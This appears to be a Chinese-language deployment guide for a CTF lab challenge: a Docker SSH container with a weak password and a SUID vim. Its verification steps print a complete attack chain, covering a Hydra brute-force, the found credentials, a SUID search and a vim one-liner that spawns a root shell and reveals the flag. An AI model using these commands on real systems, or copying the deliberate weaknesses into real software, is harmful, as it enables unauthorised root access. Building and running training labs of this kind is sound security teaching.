# Hard 題部署教學：進來只是開始

這份文件給 Blue Team / 部署者使用。部署完成後，Red Team 只需要知道目標 IP 與 port。

安全提醒：此題包含弱密碼與 SUID vim，只能部署在隔離 lab Docker / VM 環境。不要部署到真實主機、共用主機或公開網路。

## 1. 檢查部署檔案

部署會用到的檔案都在此資料夾：

```text
hard_ssh_suid_challenge/
├── Dockerfile
├── entrypoint.sh
├── docker-compose.yml
├── DEPLOY.md
├── README.md
├── CHALLENGE.md
├── SOLUTION.md
└── small-wordlist.txt
```

主要部署檔：

- `Dockerfile`：建立 SSH + SUID vim 題目環境。
- `entrypoint.sh`：啟動 SSH server，並讓 log 輸出到 `docker logs`。
- `docker-compose.yml`：一行指令啟動題目服務。
- `small-wordlist.txt`：本機驗證 Hydra 用的小字典。

## 2. 進入題目資料夾

從專案根目錄執行：

```bash
cd CTF團體報告/hard_ssh_suid_challenge
```

## 3. Docker Compose 部署方式

建議使用此方式。

建立並啟動容器：

```bash
docker compose up --build
```

服務啟動後，SSH 會對外開在：

```text
127.0.0.1:2222
```

若部署在 Linux lab 主機，Red Team 目標為：

```text
<Linux主機IP>:2222
```

停止服務：

```bash
docker compose down
```

## 4. 純 Docker 部署方式

如果環境沒有 Docker Compose，也可以使用純 Docker。

建立 image：

```bash
docker build -t hard-ssh-suid .
```

啟動容器：

```bash
docker run --rm --name hard-ssh-suid -p 2222:22 hard-ssh-suid
```

停止容器：

```bash
docker stop hard-ssh-suid
```

## 5. 部署後驗證

另開一個 terminal，確認 SSH port 開放：

```bash
nmap -sV -p 2222 127.0.0.1
```

預期看到：

```text
2222/tcp open  ssh  OpenSSH
```

用小字典確認 Hydra 可找到弱密碼：

```bash
hydra -s 2222 -l user -P small-wordlist.txt ssh://127.0.0.1
```

預期找到：

```text
user:password123
```

SSH 登入：

```bash
ssh -p 2222 user@127.0.0.1
```

密碼：

```text
password123
```

登入後確認 SUID vim：

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/bin/vim
```

預期 `/usr/bin/vim` 權限包含 SUID bit：

```text
-rwsr-xr-x
```

提權測試：

```bash
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

確認 root 與 flag：

```bash
whoami
cat /root/flag.txt
```

預期：

```text
root
FLAG{suid_vim_rooted}
```

## 6. Blue Team log 截圖

使用 Docker Compose 時：

```bash
docker compose logs
```

使用純 Docker 時：

```bash
docker logs hard-ssh-suid
```

建議截圖：

- Hydra 造成的多次 SSH login failure。
- `user` 成功登入紀錄。
- `ls -l /usr/bin/vim` 顯示 SUID。
- 提權後 `whoami` 顯示 root。
- `cat /root/flag.txt` 顯示 flag。

## 7. 常見問題

### Docker daemon 沒有啟動

錯誤：

```text
Cannot connect to the Docker daemon
```

處理方式：

- macOS / Windows：啟動 Docker Desktop。
- Linux：確認 Docker service 已啟動。

### Port 2222 已被使用

錯誤可能顯示 port already allocated。

處理方式：修改 `docker-compose.yml` 的 port mapping，例如：

```yaml
ports:
  - "2223:22"
```

之後 Red Team 指令也要改成 `-p 2223` 或 `-s 2223`。

### SSH 顯示 host key changed

本機重建容器後可能遇到 known_hosts 警告。

處理方式：

```bash
ssh-keygen -R '[127.0.0.1]:2222'
```

再重新 SSH 登入。

